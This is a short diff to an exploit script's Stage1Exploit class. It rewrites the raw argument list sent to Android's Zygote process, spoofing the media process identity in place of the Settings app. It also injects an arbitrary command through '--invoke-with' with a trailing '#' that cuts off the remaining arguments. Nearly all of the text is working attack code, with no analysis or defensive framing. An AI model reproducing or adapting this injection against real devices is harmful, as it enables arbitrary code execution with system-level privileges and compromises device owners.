@@ -191,17 +191,15 @@ class Stage1Exploit:
             "--setgid=1000",
             "--setgroups=3009,1065,3002,1023,3003,3001",
             "--runtime-args",
-            "--seinfo=platform",
-            "--nice-name=com.android.settings",
+            "--seinfo=media",
+            "--nice-name=android.process.media",
+            "--target-sdk-version=28",
+            "--instruction-set=arm",
             "--mount-external-default",
+            "--app-data-dir=/data/",
             "--runtime-flags=1",
             "--invoke-with",
             f"{command}#",
-            "--target-sdk-version=28",
-            "--instruction-set=arm",
-            "--app-data-dir=/data/data/com.android.settings",
-            "--package-name=com.android.settings",
-            "android.app.ActivityThread",
         ]
         zygote_arguments = "\n".join(
             [f"{len(raw_zygote_arguments):d}"] + raw_zygote_arguments
